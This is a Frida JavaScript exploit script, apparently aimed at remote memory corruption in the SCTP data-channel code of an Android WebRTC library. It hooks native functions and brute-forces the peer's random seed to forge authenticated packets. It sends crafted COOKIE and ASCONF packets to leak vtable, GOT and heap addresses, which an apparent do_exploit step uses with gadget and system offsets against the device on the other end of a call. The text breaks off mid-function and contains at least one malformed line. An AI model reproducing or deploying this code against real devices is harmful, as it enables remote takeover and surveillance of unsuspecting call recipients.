var myvtable = 0x685DC8;
var mymalloc = 0x6909D8;
var got_offset = mymalloc - myvtable;
var gadget_offset = 287360;
var system_offset = 329360;
var rands = Module.findExportByName("libc.so", "rand");
var srands = Module.findExportByName("libc.so", "srand");

if (!srands)
  console.log("Could not load srand");
if (!rands)
  console.log("Could not load rand");

var rand = new NativeFunction(rands, 'uint', []);
var srand = new NativeFunction(srands, 'void', [ 'uint' ]);

var item;

var base =
    Module.findExportByName("libjingle_peerconnection_so.so",
                            "Java_org_webrtc_Histogram_nativeCreateCounts");
if (!base) {
  console.log("no base");
}


var sctp_in = 0;
var sctp_out = 0;
var sctp_reset = 0;
var sctp_crc = 0;
var sctp_hmac = 0;
var srtp_out = 0;
var sctp_hmac_m = 0;
var found = 0;
console.log("Finding symbols, please wait")

var base_loc = 0x205378;

var conn_loc = 0x5EC48C;
sctp_in = base.add(conn_loc - base_loc);

var out_loc = 0x3EB78C;
sctp_out = base.add(out_loc - base_loc);

var reset_loc = 0x5ABEFC;
sctp_reset = base.add(reset_loc - base_loc);

var crc_loc = 0x5B3EAC;
sctp_crc = base.add(crc_loc - base_loc);

var hmac_loc = 0x5B04BC;
sctp_hmac = base.add(hmac_loc - base_loc);

var hmacm_loc = 0x5B0728;
sctp_hmac_m = base.add(hmacm_loc - base_loc);

var srtp_loc = 0x5AAD78;
srtp_out = base.add(srtp_loc - base_loc);

if (!sctp_in)
  console.log("couldn't find incoming sctp")
  if (!sctp_out)
  console.log("couldn't find outgoing sctp")
  if (!sctp_reset)
  console.log("couldn't find sctp reset")
  if (!sctp_crc)
  console.log("couldn't find sctp crc")
  if (!sctp_hmac)
  console.log("couldn't find sctp hmac")
  if (!srtp_out)
  console.log("couldn't find srtp out")
  if (!sctp_hmac_m)
  console.log("couldn't find hmac_m")

  var hmacm = new NativeFunction(
      sctp_hmac_m, 'uint',
      [ 'uint16', 'pointer', 'uint', 'pointer', 'uint', 'pointer', 'uint' ]);

var crc = new NativeFunction(sctp_crc, 'uint', [ 'uint', 'pointer', 'uint' ]);

var hmac = new NativeFunction(
    sctp_hmac, 'uint',
    [ 'uint16', 'pointer', 'uint', 'pointer', 'uint', 'pointer' ]);

var sendpacket =
    new NativeFunction(sctp_out, 'uint', [ 'pointer', 'pointer', 'uint64' ]);

console.log("Symbols loaded")
console.log("Please place call to target");

var state = 0;
var vtable = 0;

var init = [
  0x13, 0x88, 0x13, 0x88, 0x0,  0x0,  0x0,  0x0,  0xe2, 0x2,  0x16, 0xef, 0x1,
  0x0,  0x0,  0x56, 0xb5, 0xd0, 0x3,  0x54, 0x0,  0x2,  0x0,  0x0,  0x4,  0x0,
  0x8,  0x0,  0xd1, 0x28, 0x29, 0x80, 0xc0, 0x0,  0x0,  0x4,  0x80, 0x8,  0x0,
  0x9,  0xc0, 0xf,  0xc1, 0x80, 0x82, 0x0,  0x0,  0x0,  0x80, 0x2,  0x0,  0x24,
  0x8c, 0x9c, 0x63, 0x6d, 0xe9, 0xed, 0xf2, 0x6e, 0x99, 0x41, 0x40, 0x5c, 0xa3,
  0xd3, 0x71, 0x3b, 0x51, 0xe5, 0xa7, 0x15, 0x19, 0x24, 0xa1, 0x55, 0xdc, 0xaf,
  0x7d, 0x3,  0xf9, 0x2c, 0xc,  0x3b, 0x80, 0x4,  0x0,  0x6,  0x0,  0x1,  0x0,
  0x0,  0x80, 0x3,  0x0,  0x6,  0x80, 0xc1, 0x0,  0x0
];


Interceptor.attach(sctp_reset, {
  onEnter : function(args) {
    state++;

    console.log("now in state", state);
  }
});


var transport_ptr = 0;
var init_ack = [];
var init_count = 0;
var first = 0
var vtag = [];
var in_key = [];
var out_key = [];
var pid = 0;
var hkey = 0;
var cowbufptr = 0;
var main_buf = 0;
var dlopen = 0;

Interceptor.attach(srtp_out, {

  onEnter : function(args) {
    args[2] = ptr(0);
  }
});

Interceptor.attach(sctp_in, {

  onEnter : function(args) {
    var a = new Uint8Array(ArrayBuffer.wrap(args[1], args[2].toInt32()));
    if (state == 1) {
      if (!pid && a[12] == 1) {
        pid = 1;
        var key;
        for (var i = 0; i < a.length; i++) {
          if (a[i] == 0x80 && a[i + 1] == 0x02 && a[i + 2] == 0) {
            key =
                a[i + 4] + (a[i + 5] << 8) + (a[i + 6] << 16) + (a[i + 7] << 24)
          }
        }

        for (var j = 0; j < 70000; j++) {
          srand(j);
          for (var i = 0; i < 5; i++) {
            var r = rand();
          }
          var c = rand();
          if (c == key) {
            pid = j;
            break;
          }
        }
        console.log("Remote pid is ", pid);
        srand(pid);
        var random_mem = Memory.alloc(20);
        var random_numbers = new Uint8Array(ArrayBuffer.wrap(random_mem, 20));
        for (var i = 0; i < 5; i++) {
          var r = rand()
          random_numbers[i * 4] = r & 0xff;
          random_numbers[i * 4 + 1] = (r >> 8) & 0xff;
          random_numbers[i * 4 + 2] = (r >> 16) & 0xff;
          random_numbers[i * 4 + 3] = (r >> 24) & 0xff;
        }
        var counter = Memory.alloc(4);
        counter.writeU32(1);

        hkey = Memory.alloc(40);

        hmac(1, random_mem, 20, counter, 4, hkey);
        counter.writeU32(2);
        hmac(1, random_mem, 20, counter, 4, hkey.add(20));

        var h = new Uint8Array(ArrayBuffer.wrap(hkey, 40));
        h[16] = h[36];
        h[17] = h[37];
        h[18] = h[38];
        h[19] = h[39];
        console.log("Key determination complete");
      }
    }
    if (state == 1) {

      if (!first) {
        for (var i = 0; i < a.length; i++) {
          if (a[i] == 0x80 && a[i + 1] == 2) {
            for (var j = 0; j < 0x24; j++) {
              in_key[j] = a[i + j]
            }
          }
          if (a[i] == 0x80 && a[i + 1] == 3) {
            for (var j = 0; j < 0x6; j++) {
              in_key[j + 0x24] = a[i + j]
            }
          }
          if (a[i] == 0x80 && a[i + 1] == 4) {
            for (var j = 0; j < 0x6; j++) {
              in_key[j + 0x24 + 6] = a[i + j]
            }
          }
        }
        var s = "";
        for (item in in_key) {
          s = s + in_key[item].toString(16) + " "
        }
        for (var i = 0; i < init.length; i++) {
          if (init[i] == 0x80 && init[i + 1] == 2) {
            for (var j = 0; j < 0x24; j++) {
              out_key[j] = init[i + j]
            }
          }
          if (init[i] == 0x80 && init[i + 1] == 3) {
            for (var j = 0; j < 0x6; j++) {
              out_key[j + 0x24] = init[i + j]
            }
          }
          if (a[i] == 0x80 && init[i + 1] == 4) {
            for (var j = 0; j < 0x6; j++) {
              out_key[j + 0x24 + 6] = init[i + j]
            }
          }
        }
        s = "";
        for (item in out_key) {
          s = s + out_key[item].toString(16) + " "
        }

        first = 1;
        vtag[0] = a[16];
        vtag[1] = a[17];
        vtag[2] = a[18];
        vtag[3] = a[19];
      }
      if (a[12] == 2) {
        var t = args[1].add(0x9c);
        transport_ptr = [] for (var i = 0; i < 8; i++) {
          transport_ptr[i] = t.readU8();
          t = t.add(1);
        }
        if (transport_ptr[3] & 0x80) {

        } else {
          var q = transport_ptr[0] + (transport_ptr[1] << 8) +
                  (transport_ptr[2] << 16) + (transport_ptr[3] << 24)
          console.log(
              "Transport location on heap is unfavourable and might crash the target. Please try again",
              transport_ptr[4].toString(16), q.toString(16));
          exit();
        }
        init_ack = [];
        for (var i = 0; i < a.length; i++) {
          init_ack[i] = a[i];
        }
        init_count++;
      }
      if (a[12] == 130) {
        var t = args[1].add(0x24);
        if (!vtable) {
          vtable = t.readPointer();
          console.log("vtable is", vtable);
          vtable = [];
          for (var i = 0; i < 8; i++) {
            vtable[i] = t.add(i).readU8();
          }
          if (vtable[5] || vtable[6] || vtable[7]) {
            console.log(
                "vtable was read incorrectly, target will probably crash. Please try again");
            exit();
          }
          read_got();
        } else if (!dlopen) {
          t = args[1].add(0xb2);
          dlopen = t.readU64();
          console.log("malloc at", dlopen.toString(16), "in libc");

          dlopen = [];
          for (var i = 0; i < 8; i++) {
            dlopen[i] = t.add(i).readU8();
          }
          on_vtable();

        } else if (!cowbufptr) {
          t = args[1].add(0x10c);
          cowbufptr = t.readU64();
          console.log("COW buf address", cowbufptr.toString(16));
          cowbufptr = [];
          for (var i = 0; i < 8; i++) {
            cowbufptr[i] = t.add(i).readU8();
          }

          on_cow();
        } else {

          t = args[1].add(0x18c);
          main_buf = t.readU64();
          console.log("Copy on write buffer backing is at",
                      main_buf.toString(16));
          main_buf = [];
          for (var i = 0; i < 8; i++) {
            main_buf[i] = t.add(i).readU8();
          }


          do_exploit();
        }
      }
    }
  }
});

function add_crc(mdata, mlen, addr) {

  mdata[8] = 0;
  mdata[9] = 0;
  mdata[10] = 0;
  mdata[11] = 0;
  var y = (~crc(0xffffffff, addr, mlen));

  mdata[8] = y & 0xff;
  mdata[9] = (y >> 8) & 0xff;
  mdata[10] = (y >> 16) & 0xff;
  mdata[11] = (y >> 24) & 0xff;
}

var asconf = [
  0x13, 0x88, 0x13, 0x88, 0x44, 0xf0, 0x47, 0x90, 0x47, 0xa3, 0x5a, 0x9a,
  0xf,  0x0,  0x0,  0x1c, 0x0,  0x0,  0x0,  0x1,  0x92, 0xf1, 0xef, 0x85,
  0x7a, 0x84, 0xf2, 0xcf, 0xa0, 0x32, 0x5d, 0xc1, 0x98, 0xa4, 0x24, 0x31,
  0x7d, 0xa5, 0xd3, 0x85, 0xc1, 0x80, 0x0,  0x28, 0xd1, 0x28, 0x29, 0x80,
  0x5,  0x0,  0x0,  0x8,  0x0,  0x0,  0x0,  0x0,  0xc0, 0x1,  0x0,  0xc,
  0x77, 0x1,  0x0,  0x8,  0x99, 0x99, 0x99, 0x99, 0x77, 0x1,  0x0,  0x4,
  0x77, 0x1,  0x0,  0x8,  0x99, 0x99, 0x99, 0x99, 0x82, 0x80, 0x0,  0xf5,
  0x0,  0xd,  0x0,  0xf1, 0xd1, 0x28, 0x29, 0x80, 0x11, 0x22, 0x33, 0x44,
  0x0,  0x0,  0x0,  0x7c, 0x4,  0x5,  0x6,  0x7,  0x8,  0x9,  0xa,  0xb,
  0xc,  0xd,  0xe,  0xf,  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
  0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23,
  0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f,
  0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b,
  0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
  0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53,
  0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f,
  0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b,
  0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
  0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83,
  0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f,
  0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0x9b,
  0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
  0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3,
  0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf,
  0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb,
  0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7,
  0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3,
  0xe4
];

var reset = [
  0x82, 0x80, 0x0,  0xf5, 0x0,  0xd,  0x0,  0xf1, 0xd1, 0x28, 0x29, 0x80, 0x11,
  0x22, 0x33, 0x44, 0x0,  0x0,  0x0,  0x7c, 0x4,  0x5,  0x6,  0x7,  0x8,  0x9,
  0xa,  0xb,  0xc,  0xd,  0xe,  0xf,  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
  0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23,
  0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30,
  0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d,
  0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a,
  0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
  0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64,
  0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71,
  0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e,
  0x7f, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b,
  0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
  0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5,
  0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2,
  0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf,
  0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc,
  0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9,
  0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0,    4,
  0,    8,    7,    7,    7,    7
];

var payload = [
  0x13, 0x88, 0x13, 0x88, 0x5b, 0xa4, 0x25, 0x40, 0xef, 0xf5, 0xbd, 0x6f,
  0x0,  0x2,  0x0,  0x5f, 0xe8, 0x9d, 0xea, 0xb6, 0x0,  0x0,  0x0,  0x0,
  0x0,  0x0,  0x0,  0x0,  0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e,
  0x61, 0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69,
  0x65, 0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e, 0x61, 0x74, 0x61,
  0x6c, 0x69, 0x65, 0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e, 0x61,
  0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69, 0x65,
  0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e, 0x61, 0x74, 0x61, 0x6c,
  0x69, 0x65, 0x6e, 0x61, 0x74, 0x61, 0x6c, 0x69, 0x65, 0x6e, 0x61, 0x0
];

var cookie =
    [
      0x13, 0x88, 0x13, 0x88, 0x44, 0xf0, 0x47, 0x90, 0x2a, 0x3b, 0xdb, 0x77,
      0xa,  0x0,  0x1,  0x38, 0x4b, 0x41, 0x4d, 0x45, 0x2d, 0x42, 0x53, 0x44,
      0x20, 0x31, 0x2e, 0x31, 0x0,  0x0,  0x0,  0x0,  0x3f, 0x8a, 0x3c, 0x5e,
      0x0,  0x0,  0x0,  0x0,  0x30, 0x61, 0x3,  0x0,  0x0,  0x0,  0x0,  0x0,
      0x60, 0xea, 0x0,  0x0,  0x6b, 0xd7, 0x79, 0x10, 0xa5, 0x27, 0x52, 0xc9,
      0x54, 0x3,  0xd0, 0xb5, 0x44, 0xf0, 0x47, 0x90, 0x80, 0x29, 0x28, 0xd1,
      0x7c, 0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,
      0x4,  0x0,  0x0,  0x0,  0x80, 0x29, 0x28, 0xd1, 0x7c, 0x0,  0x0,  0x0,
      0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x4,  0x0,  0x0,  0x0,
      0x0,  0x0,  0x0,  0x0,  0x13, 0x88, 0x13, 0x88, 0x0,  0x0,  0x1,  0x0,
      0x1,  0x1,  0x1,  0x0,  0x0,  0x0,  0x0,  0x0,  0x1,  0x0,  0x0,  0x56,
      0xb5, 0xd0, 0x3,  0x54, 0x0,  0x2,  0x0,  0x0,  0x4,  0x0,  0x8,  0x0,
      0xd1, 0x28, 0x29, 0x80, 0xc0, 0x0,  0x0,  0x4,  0x80, 0x8,  0x0,  0x9,
      0xc0, 0xf,  0xc1, 0x80, 0x82, 0x0,  0x0,  0x0,  0x80, 0x2,  0x0,  0x24,
      0x8c, 0x9c, 0x63, 0x6d, 0xe9, 0xed, 0xf2, 0x6e, 0x99, 0x41, 0x40, 0x5c,
      0xa3, 0xd3, 0x71, 0x3b, 0x51, 0xe5, 0xa7, 0x15, 0x19, 0x24, 0xa1, 0x55,
      0xdc, 0xaf, 0x7d, 0x3,  0xf9, 0x2c, 0xc,  0x3b, 0x80, 0x4,  0x0,  0x6,
      0x0,  0x1,  0x0,  0x0,  0x80, 0x3,  0x0,  0x6,  0x80, 0xc1, 0x0,  0x0,
      0x2,  0x0,  0x1,  0x90, 0x44, 0xf0, 0x47, 0x90, 0x0,  0x2,  0x0,  0x0,
      0x4,  0x0,  0x8,  0x0,  0xec, 0x4f, 0xcc, 0x9c, 0xc0, 0x0,  0x0,  0x4,
      0x80, 0x8,  0x0,  0x9,  0xc0, 0xf,  0xc1, 0x80, 0x82, 0x0,  0x0,  0x0,
      0x80, 0x2,  0x0,  0x24, 0x4e, 0xf2, 0xd,  0x17, 0x29, 0xf3, 0x65, 0x7f,
      0x51, 0x9c, 0x76, 0x6c, 0x6a, 0x4,  0xb9, 0xe,  0x47, 0x4e, 0x88, 0x7e,
      0xfa, 0xf3, 0x7d, 0x54, 0x38, 0x21, 0x32, 0x2b, 0xd5, 0xb0, 0x44, 0x5e,
      0x80, 0x4,  0x0,  0x6,  0x0,  0x1,  0x0,  0x0,  0x80, 0x3,  0x0,  0x6,
      0x80, 0xc1, 0x0,  0x0,  0x3f, 0x68, 0x15, 0xaf, 0x78, 0x3f, 0xc3, 0x85,
      0x98, 0x88, 0x39, 0xc1, 0x5f, 0x7e, 0x56, 0x9e, 0xe0, 0xa1, 0x6a, 0x1b,
      0x0,  0x3,  0x0,  0x25, 0xd1, 0x28, 0x29, 0x80, 0x0,  0x1,  0x0,  0x0,
      0x0,  0x0,  0x0,  0x32, 0x3,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,
      0x0,  0x9,  0x0,  0x0,  0x73, 0x69, 0x67, 0x6e, 0x61, 0x6c, 0x69, 0x6e,
      0x67, 0x0,  0x0,  0x0
    ]

    var cookie2 = [
      0x13, 0x88, 0x13, 0x88, 0x44, 0xf0, 0x47, 0x90, 0x2a, 0x3b, 0xdb, 0x77,
      0xa,  0x0,  0x1,  0x38, 0x4b, 0x41, 0x4d, 0x45, 0x2d, 0x42, 0x53, 0x44,
      0x20, 0x31, 0x2e, 0x31, 0x0,  0x0,  0x0,  0x0,  0x3f, 0x8a, 0x3c, 0x5e,
      0x0,  0x0,  0x0,  0x0,  0x30, 0x61, 0x3,  0x0,  0x0,  0x0,  0x0,  0x0,
      0x60, 0xea, 0x0,  0x0,  0x6b, 0xd7, 0x79, 0x10, 0xa5, 0x27, 0x52, 0xc9,
      0x54, 0x3,  0xd0, 0xb5, 0x44, 0xf0, 0x47, 0x90, 0x80, 0x29, 0x28, 0xd1,
      0x7c, 0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,
      0x4,  0x0,  0x0,  0x0,  0x80, 0x29, 0x28, 0xd1, 0x7c, 0x0,  0x0,  0x0,
      0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x4,  0x0,  0x0,  0x0,
      0x0,  0x0,  0x0,  0x0,  0x13, 0x88, 0x13, 0x88, 0x0,  0x0,  0x1,  0x0,
      0x1,  0x1,  0x1,  0x0,  0x0,  0x0,  0x0,  0x0,  0x1,  0x0,  0x0,  0x56,
      0xb5, 0xd0, 0x3,  0x54, 0x0,  0x2,  0x0,  0x0,  0x4,  0x0,  0x8,  0x0,
      0xd1, 0x28, 0x29, 0x80, 0xc0, 0x0,  0x0,  0x4,  0x80, 0x8,  0x0,  0x9,
      0xc0, 0xf,  0xc1, 0x80, 0x82, 0x0,  0x0,  0x0,  0x80, 0x2,  0x0,  0x24,
      0x8c, 0x9c, 0x63, 0x6d, 0xe9, 0xed, 0xf2, 0x6e, 0x99, 0x41, 0x40, 0x5c,
      0xa3, 0xd3, 0x71, 0x3b, 0x51, 0xe5, 0xa7, 0x15, 0x19, 0x24, 0xa1, 0x55,
      0xdc, 0xaf, 0x7d, 0x3,  0xf9, 0x2c, 0xc,  0x3b, 0x80, 0x4,  0x0,  0x6,
      0x0,  0x1,  0x0,  0x0,  0x80, 0x3,  0x0,  0x6,  0x80, 0xc1, 0x0,  0x0,
      0x2,  0x0,  0x1,  0x90, 0x44, 0xf0, 0x47, 0x90, 0x0,  0x2,  0x0,  0x0,
      0x4,  0x0,  0x8,  0x0,  0xec, 0x4f, 0xcc, 0x9c, 0xc0, 0x0,  0x0,  0x4,
      0x80, 0x8,  0x0,  0x9,  0xc0, 0xf,  0xc1, 0x80, 0x82, 0x0,  0x0,  0x0,
      0x80, 0x2,  0x0,  0x24, 0x4e, 0xf2, 0xd,  0x17, 0x29, 0xf3, 0x65, 0x7f,
      0x51, 0x9c, 0x76, 0x6c, 0x6a, 0x4,  0xb9, 0xe,  0x47, 0x4e, 0x88, 0x7e,
      0xfa, 0xf3, 0x7d, 0x54, 0x38, 0x21, 0x32, 0x2b, 0xd5, 0xb0, 0x44, 0x5e,
      0x80, 0x4,  0x0,  0x6,  0x0,  0x1,  0x0,  0x0,  0x80, 0x3,  0x0,  0x6,
      0x80, 0xc1, 0x0,  0x0,  0x3f, 0x68, 0x15, 0xaf, 0x78, 0x3f, 0xc3, 0x85,
      0x98, 0x88, 0x39, 0xc1, 0x5f, 0x7e, 0x56, 0x9e, 0xe0, 0xa1, 0x6a, 0x1b,
      0x0,  0x3,  0x0,  0x25, 0xd1, 0x28, 0x29, 0x80, 0x0,  0x1,  0x0,  0x0,
      0x0,  0x0,  0x0,  0x32, 0x3,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,  0x0,
      0x0,  0x9,  0x0,  0x0,  0x73, 0x69, 0x67, 0x6e, 0x61, 0x6c, 0x69, 0x6e,
      0x67, 0x0,  0x0,  0x0
    ];

var cookie_back = [];
var need_out_key = 0;
var senddata = 1;
var count = 0;
var need_buf = 1;
var start_main = 1;
var transport = 0;
var read_got1 = 1;

function read_got() {
  if (read_got1) {
    read_got1 = 0;
  }

  console.log("Starting GOT read");
  var m = Memory.alloc(2048);
  var p = new Uint8Array(ArrayBuffer.wrap(m, 2048));
  var a = p;
  for (var i = 0; i < cookie.length; i++) {

    a[i] = cookie[i]
  }

  var n = vtable[0] + (vtable[1] << 8) + (vtable[2] << 16) + (vtable[3] << 24);
  n = n + got_offset - 30;

  var np = [];

  np[0] = n & 0xff;
  np[1] = (n >> 8) & 0xff;
  np[2] = (n >> 16) & 0xff;
  np[3] = (n >> 24) & 0xff;
  np[4] = vtable[4];

  p[4] = vtag[0]
  p[5] = vtag[1]
  p[6] = vtag[2]
  p[7] = vtag[3]

  p[0x84] = 0x12;
  p[0x85] = 0x34;
  p[0x86] = 0x56;
  p[0x87] = 0x79;

  p[64] = vtag[0]
  p[65] = vtag[1]
  p[66] = vtag[2]
  p[67] = vtag[3]
  a[0x93] = np[0];
  a[0x92] = np[1];
  a[0x91] = np[2];
  a[0x90] = np[3];
  for (var i = 0; i < 0xd0; i++) {
    if (cookie[i] == 0x80 && cookie[i + 1] == 2) {
      for (var j = 0; j < 0x24; j++) {
        out_key[j] = cookie[i + j]
      }
    }
    if (cookie[i] == 0x80 && cookie[i + 1] == 3) {
      for (var j = 0; j < 0x6; j++) {
        out_key[j + 0x24] = cookie[i + j]
      }
    }
    if (a[i] == 0x80 && cookie[i + 1] == 4) {
      for (var j = 0; j < 0x6; j++) {
        out_key[j + 0x24 + 6] = cookie[i + j]
      }
    }
  }
  var s = "";
  for (item in out_key) {
    s = s + out_key[item].toString(16) + " "
  }

  var clen = (a[14] << 8) + a[15];
  var mbuf = Memory.alloc(256);
  var mptr = new Uint32Array(ArrayBuffer.wrap(mbuf, 256));

  mbuf.writePointer(ptr(0));
  mbuf.add(8).writePointer(ptr(0));
  mbuf.add(16).writePointer(m.add(12));
  mbuf.add(24).writeU32(clen);
  mbuf.add(28).writeU32(clen);
  hmacm(1, hkey, 32, mbuf, 4, m.add((clen + 12) - 20), 20);
  add_crc(a, clen + 12, m);
  sendpacket(transport, m, clen + 12);
  for (var i = 0; i < asconf.length; i++) {

    a[i] = asconf[i]
  }

  var new_ptr = np;

  a[4] = vtag[0]
  a[5] = vtag[1]
  a[6] = vtag[2]
  a[7] = vtag[3]
  a[0x2c] = new_ptr[3]; // id
  a[0x2d] = new_ptr[2];
  a[0x2e] = new_ptr[1];
  a[0x2f] = new_ptr[0];
  a[0x58] = new_ptr[3];
  a[0x59] = new_ptr[2];
  a[0x5a] = new_ptr[1];
  a[0x5b] = new_ptr[0];
  a[0x60] = 0;
  a[0x61] = 0;
  a[0x62] = 0;
  a[0x63] = new_ptr[4];
  for (var i = 20; i < 40; i++) {

    a[i] = 0;
  }
  var k = Memory.alloc(0x30 * 2);
  var kw = new Uint8Array(ArrayBuffer.wrap(k, 0x30 * 2));
  var fkey;
  var nkey;
  if (in_key[4] < out_key[4]) {
    fkey = in_key;
    nkey = out_key;

  } else {
    fkey = out_key;
    nkey = in_key;
  }

  for (var i = 0; i < 0x30; i++) {
    kw[i] = fkey[i]
  }
  for (var i = 0; i < 0x30; i++) {
    kw[i + 0x30] = nkey[i];
  }
  var s = ""
  for (var i = 0; i < 0x30 * 2; i++) {
    s = s + kw[i].toString(16) + " "
  }

  var vals = [];
  for (var i = 40; i < asconf.length;
       i++) { // add an extra asconf with an error to prevent free
    vals[i] = a[i];
  }
  for (var i = 40; i < asconf.length;
       i++) { // add an extra asconf with an error to prevent free
    a[i + 4] = vals[i];
  }
  a[42] = 0;
  a[43] = 4;

  hmac(1, k, 0x30 * 2, m.add(12), asconf.length - 12 + 4, m.add(20));
  add_crc(a, asconf.length + 4, m);
  sendpacket(transport, m, asconf.length + 4);
}

function on_vtable() {

  if (vtable && senddata) {
    senddata = 0;
    var m = Memory.alloc(2048);
    var p = new Uint8Array(ArrayBuffer.wrap(m, 2048));

    var a = p;

    for (var i = 0; i < cookie.length; i++) {

      a[i] = cookie[i]
    }

    var np = transport_ptr[0] + (transport_ptr[1] << 8) +
             (transport_ptr[2] << 16) + (transport_ptr[3] << 24) + 0x148
    p[4] = vtag[0]
    p[5] = vtag[1]
    p[6] = vtag[2]
    p[7] = vtag[3]


    p[0x84] = 0x55;
    p[0x85] = 0x66;
    p[0x86] = 0x77;
    p[0x87] = 0x88;

    p[64] = vtag[0]
    p[65] = vtag[1]
    p[66] = vtag[2]
    p[67] = vtag[3]
    a[0x93] = np & 0xff;
    a[0x92] = (np >> 8) & 0xff;
    a[0x91] = (np >> 16) & 0xff;
    a[0x90] = (np >> 24) & 0xff;


    for (var i = 0; i < 0xd0; i++) {
      if (cookie[i] == 0x80 && cookie[i + 1] == 2) {
        for (var j = 0; j < 0x24; j++) {
          out_key[j] = cookie[i + j]
        }
      }
      if (cookie[i] == 0x80 && cookie[i + 1] == 3) {
        for (var j = 0; j < 0x6; j++) {
          out_key[j + 0x24] = cookie[i + j]
        }
      }
      if (a[i] == 0x80 && cookie[i + 1] == 4) {
        for (var j = 0; j < 0x6; j++) {
          out_key[j + 0x24 + 6] = cookie[i + j]
        }
      }
    }
    var s = "";
    for (item in out_key) {
      s = s + out_key[item].toString(16) + " "
    }

    var clen = (a[14] << 8) + a[15];
    var mbuf = Memory.alloc(256);
    var mptr = new Uint32Array(ArrayBuffer.wrap(mbuf, 256));

    mbuf.writePointer(ptr(0));
    mbuf.add(8).writePointer(ptr(0));
    mbuf.add(16).writePointer(m.add(12));
    mbuf.add(24).writeU32(clen);
    mbuf.add(28).writeU32(clen);
